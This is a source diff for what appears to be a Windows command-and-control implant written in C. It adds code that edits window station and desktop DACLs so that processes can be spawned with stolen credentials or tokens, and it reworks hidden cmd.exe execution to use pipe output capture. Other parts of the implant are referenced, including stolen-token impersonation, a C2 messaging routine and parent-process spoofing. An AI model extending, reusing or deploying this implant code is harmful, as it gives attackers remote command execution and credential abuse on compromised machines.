@@ -419,11 +419,117 @@ char *send_c2_message(const char *json_msg) {
   return response_buffer;
 }
 
+/* ---- Window station / desktop DACL helper -------------------------
+ * Required before CreateProcessWithLogonW for non-netonly logons.
+ * Without this the spawned process cannot access the window station
+ * and CreateProcessWithLogonW returns ERROR_ACCESS_DENIED (5).
+ * Replicates the RunasCS WindowStationDACL logic. */
+
+#define WINSTA_ALL_KRATOS  0x000F037FUL
+#define DESKTOP_ALL_KRATOS (0x01FFUL | READ_CONTROL | WRITE_DAC | WRITE_OWNER | GENERIC_ALL)
+
+static int add_ace_to_winobj(HANDLE hObj, PSID pSid, DWORD access, BYTE flags) {
+    SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
+    DWORD cbSd = 0;
+    GetUserObjectSecurity(hObj, &si, NULL, 0, &cbSd);
+    if (!cbSd) return 0;
+    PSECURITY_DESCRIPTOR pSd = HeapAlloc(GetProcessHeap(), 0, cbSd);
+    if (!pSd) return 0;
+    if (!GetUserObjectSecurity(hObj, &si, pSd, cbSd, &cbSd)) {
+        HeapFree(GetProcessHeap(), 0, pSd); return 0;
+    }
+    BOOL bPresent = FALSE, bDefault = FALSE;
+    PACL pDacl = NULL;
+    GetSecurityDescriptorDacl(pSd, &bPresent, &pDacl, &bDefault);
+    ACL_SIZE_INFORMATION aclInfo = {0};
+    DWORD cbDacl = 0;
+    if (pDacl) {
+        GetAclInformation(pDacl, &aclInfo, sizeof(aclInfo), AclSizeInformation);
+        cbDacl = aclInfo.AclBytesInUse;
+    }
+    DWORD cbSid    = GetLengthSid(pSid);
+    DWORD cbNewAce = sizeof(ACCESS_ALLOWED_ACE) + cbSid - sizeof(DWORD);
+    DWORD cbNewDacl = cbDacl + cbNewAce + 8;
+    PACL pNewDacl = HeapAlloc(GetProcessHeap(), 0, cbNewDacl);
+    if (!pNewDacl) { HeapFree(GetProcessHeap(), 0, pSd); return 0; }
+    InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION);
+    if (bPresent && pDacl) {
+        for (DWORD i = 0; i < aclInfo.AceCount; i++) {
+            LPVOID pAce = NULL;
+            if (GetAce(pDacl, i, &pAce))
+                AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pAce, ((ACE_HEADER *)pAce)->AceSize);
+        }
+    }
+    AddAccessAllowedAceEx(pNewDacl, ACL_REVISION, flags, access, pSid);
+    PSECURITY_DESCRIPTOR pNewSd = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbSd);
+    InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION);
+    SetSecurityDescriptorDacl(pNewSd, TRUE, pNewDacl, FALSE);
+    BOOL ok = SetUserObjectSecurity(hObj, &si, pNewSd);
+    HeapFree(GetProcessHeap(), 0, pSd);
+    HeapFree(GetProcessHeap(), 0, pNewDacl);
+    HeapFree(GetProcessHeap(), 0, pNewSd);
+    return ok ? 1 : 0;
+}
+
+int grant_winsta_desktop_access(const char *username, const char *domain,
+                                char *desktop_out, size_t desktop_out_len) {
+    char full_name[512];
+    if (domain && domain[0] && strcmp(domain, ".") != 0)
+        snprintf(full_name, sizeof(full_name), "%s\\%s", domain, username);
+    else
+        snprintf(full_name, sizeof(full_name), "%s", username);
+
+    BYTE   sid_buf[256]    = {0};
+    DWORD  sid_len         = sizeof(sid_buf);
+    char   ref_domain[256] = {0};
+    DWORD  ref_len         = sizeof(ref_domain);
+    SID_NAME_USE snu;
+    if (!LookupAccountNameA(NULL, full_name, (PSID)sid_buf, &sid_len,
+                            ref_domain, &ref_len, &snu))
+        return 0;
+    PSID pSid = (PSID)sid_buf;
+
+    HWINSTA hWinstaSave = GetProcessWindowStation();
+    if (!hWinstaSave) return 0;
+
+    char station_name[256] = {0};
+    DWORD needed = 0;
+    GetUserObjectInformationA(hWinstaSave, UOI_NAME,
+                              station_name, sizeof(station_name), &needed);
+
+    HWINSTA hWinsta = OpenWindowStationA(station_name, FALSE,
+                                         READ_CONTROL | WRITE_DAC);
+    if (!hWinsta) return 0;
+
+    SetProcessWindowStation(hWinsta);
+    HDESK hDesktop = OpenDesktopA("Default", 0, FALSE,
+        READ_CONTROL | WRITE_DAC | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS);
+    SetProcessWindowStation(hWinstaSave);
+
+    if (!hDesktop) { CloseWindowStation(hWinsta); return 0; }
+
+    /* Two ACEs for window station (mirrors RunasCS AddAceToWindowStation) */
+    add_ace_to_winobj((HANDLE)hWinsta, pSid,
+                      GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE | GENERIC_ALL,
+                      CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE);
+    add_ace_to_winobj((HANDLE)hWinsta, pSid,
+                      WINSTA_ALL_KRATOS, NO_PROPAGATE_INHERIT_ACE);
+
+    /* One ACE for desktop */
+    add_ace_to_winobj((HANDLE)hDesktop, pSid, DESKTOP_ALL_KRATOS, 0);
+
+    CloseDesktop(hDesktop);
+    CloseWindowStation(hWinsta);
+
+    snprintf(desktop_out, desktop_out_len, "%s\\Default", station_name);
+    return 1;
+}
+
 /* ---- Shared pipe output reader (Xenon-style polling) ------------- */
 /* ReadFile blocking waits for ALL write ends to close, which deadlocks
  * when the child process spawns sub-processes that inherit the write end.
  * PeekNamedPipe polls without blocking, draining as data arrives. */
-static char *read_pipe_output(HANDLE hRead, HANDLE hProcess) {
+char *read_pipe_output(HANDLE hRead, HANDLE hProcess) {
   char *output = (char *)malloc(1);
   output[0] = '\0';
   size_t total = 0;
@@ -720,67 +826,18 @@ char *execute_shell(const char *cmd) {
     return execute_shell_netonly(cmd);
   }
 
-  /* If a stolen token is active, attempt to spawn via SecLogon */
   if (g_stolen_token != NULL) {
     return execute_shell_with_token(g_stolen_token, cmd);
   }
 
-  /* Chemin de cmd.exe */
   char cmd_path[MAX_PATH];
   GetSystemDirectoryA(cmd_path, sizeof(cmd_path));
   strncat(cmd_path, "\\cmd.exe", sizeof(cmd_path) - strlen(cmd_path) - 1);
 
-  /* Fichier temporaire pour capturer stdout+stderr */
-  char sys_root[MAX_PATH] = "C:\\Windows";
-  GetEnvironmentVariableA("SystemRoot", sys_root, sizeof(sys_root));
-  char tmp_file[MAX_PATH];
-  snprintf(tmp_file, sizeof(tmp_file), "%s\\Temp\\krt%lu.tmp", sys_root,
-           GetCurrentProcessId() ^ GetCurrentThreadId());
+  char cmdline[2048];
+  snprintf(cmdline, sizeof(cmdline), "\"%s\" /c %s", cmd_path, cmd);
 
-  char full[2048];
-  snprintf(full, sizeof(full), "%s /c %s > \"%s\" 2>&1", cmd_path, cmd, tmp_file);
-
-  STARTUPINFOA si;
-  ZeroMemory(&si, sizeof(si));
-  si.cb = sizeof(si);
-  si.dwFlags = STARTF_USESHOWWINDOW;
-  si.wShowWindow = SW_HIDE;
-
-  PROCESS_INFORMATION pi;
-  ZeroMemory(&pi, sizeof(pi));
-
-  if (!CreateProcessA(NULL, full, NULL, NULL, FALSE,
-                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-    DeleteFileA(tmp_file);
-    return strdup("Error: CreateProcess failed");
-  }
-
-  WaitForSingleObject(pi.hProcess, 30000);
-  CloseHandle(pi.hProcess);
-  CloseHandle(pi.hThread);
-
-  /* Lire le fichier de sortie */
-  HANDLE hFile = CreateFileA(tmp_file, GENERIC_READ,
-                              FILE_SHARE_READ | FILE_SHARE_WRITE,
-                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-  char *output = (char *)malloc(1);
-  output[0] = '\0';
-  size_t total_len = 0;
-
-  if (hFile != INVALID_HANDLE_VALUE) {
-    char buf[4096];
-    DWORD bytes_read;
-    while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytes_read, NULL) &&
-           bytes_read > 0) {
-      output = (char *)realloc(output, total_len + bytes_read + 1);
-      memcpy(output + total_len, buf, bytes_read);
-      total_len += bytes_read;
-      output[total_len] = '\0';
-    }
-    CloseHandle(hFile);
-  }
-  DeleteFileA(tmp_file);
-  return output;
+  return spawn_with_pipes(cmd_path, cmdline, FALSE);
 }
 
 /* run: spawn the executable directly, no cmd.exe, pipes + PPID spoof */
